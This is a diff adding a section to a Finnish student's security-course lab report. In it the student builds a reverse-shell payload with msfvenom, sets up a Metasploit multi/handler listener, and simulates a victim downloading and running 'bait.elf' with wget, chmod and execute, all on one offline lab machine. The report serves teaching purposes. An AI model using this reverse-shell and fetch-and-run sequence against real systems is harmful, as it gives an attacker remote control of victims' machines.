@@ -287,9 +287,54 @@ Hyvä John!
 
 Poistetaan vielä avaimet, ettei niitä vahingossa käytetä.
 
+## f) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.
+
+En ihan ymmärtänyt, että mitä pitää tehdä tässä tehtävässä. Löysin YouTubesta [tämän](https://www.youtube.com/watch?v=ZqWfDrD2WVY) videon (Cyber Offense 2022), jossa luodaan msfvenomilla haittaohjelma ja simuloidaan sen jakaminen web-palvelimelta kohteeseen ja napataan reverse shell käyttöön kohteen ajettua tiedosto. Videon katsottuani arvelin, että onnistun riittävällä tasolla simuloimaan hyökkäyksen etenemisen yhdellä koneella.
+
+Ohjelman teko mukailtu MsfVenom cheatsheetistä (HackTricks 2024).
+
+![image](https://github.com/user-attachments/assets/74099e99-dd29-4ddc-9e54-c03ab38bc5f7)
+> Kuva 38. Haittaohjelman luominen.
+
+![image](https://github.com/user-attachments/assets/8715234f-5ef0-4146-a032-b1125e52af70)
+> Kuva 39. Web-palvelin päälle.
+
+Tässä vaiheessa varmistus, ettei labra saa yhteyttä internetiin (`sudo ifconfig eth0 down`).
+
+![image](https://github.com/user-attachments/assets/57dc586e-881c-4078-9d9c-3c05d41ee1fe)
+> Kuva 40. Ei varmana vuoda paketteja.
+
+Käynnistetään multi handler msfconsolessa (Cyber Offense 2022).
+
+![image](https://github.com/user-attachments/assets/6739f190-08a0-48a0-a53a-b5d81903e6a8)
+> Kuva 41. Multi handler päälle ja payloadin valinta.
+
+Tämän jälkeen määritetään haittaohjelmaan kirjoitetut parametrit eli ne tiedot, ip ja portti, joihin haittaohjelma yrittää muodostaa yhteden ja avata reverse shellin.
+
+    set LHOST [haittaohjelmaan kirjoitettu ip]
+    set LPORT [haittaohjelmaan kirjoitettu portti]
+    exploit
+
+Nyt kuuntelu on käynnissä ja hyökkäjä on valmis vastaanottamaan haittaohjelman suorittajan koneeseen yhteyspyynnön ja shellin.
+
+Ajetaan haittaohjelma. Kuvaan kohdetta yksinkertaisesti siirtymällä uuteen hakemistoon ja lataamaan web-palvelimen kautta tiedoston. Tämän jälkeen annetaan ajo-oikeudet tiedostoon ja se suoritetaan.
+
+    mkdir fish    # kuvaa käyttäjän konetta
+    cd fish
+    wget http://localhost:8000/bait.elf
+    chmod u+x bait.elf
+    ./bait.elf
+
+Miltäs näyttää msfconsolessa?
+
+![image](https://github.com/user-attachments/assets/4c191b39-0e09-4935-a617-0a45e8b26464)
+> Kuva 42. Kohde hallinnassa.
+
 ## Lähteet
 
 Arminius, 2018. Why won't pdf2john extract the password hash of this encrypted pdf? Getting blank results. Answers. Luettavissa: https://security.stackexchange.com/a/183560 Luettu: 2024-11-17
+
+Cyber Offense, 2022. Use Msfvenom to Create a Reverse TCP Payload. Katsottavissa: https://www.youtube.com/watch?v=ZqWfDrD2WVY Katsottu: 2024-11-19
 
 guntbert, 2015. How to get the MD5 hash of a string directly in the terminal? Answers. Luettavissa: https://askubuntu.com/questions/53846/how-to-get-the-md5-hash-of-a-string-directly-in-the-terminal Luettu: 2024-11-16
 
